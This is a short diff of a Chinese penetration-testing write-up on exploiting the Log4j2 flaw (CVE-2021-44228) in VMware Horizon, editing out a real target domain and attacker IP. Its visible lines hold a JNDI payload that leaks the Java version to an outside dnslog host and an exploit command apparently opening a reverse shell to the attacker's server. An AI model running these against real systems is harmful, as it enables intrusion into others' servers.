@@ -10,7 +10,7 @@ tags: [肾透, 漏洞利用]
 
 ## 前期测试
 
-漏洞url：[VMware Horizon (yghuagong.com)](https://system.yghuagong.com/)
+
 
 VMWare Horizon 存在 log4j2 CVE-2021-44228 漏洞
 
@@ -33,7 +33,7 @@ ${jndi:dns://${sys:java.version}.rn6t7t.dnslog.cn}
 攻击机：
 
 ```python3
-python3 exploit.py -r -t system.yghuagong.com -p 9001 -i 101.43.147.82
+python3 exploit.py -r -t xxx.xxx.com -p 9001 -i vps
 ```
 
 监听：
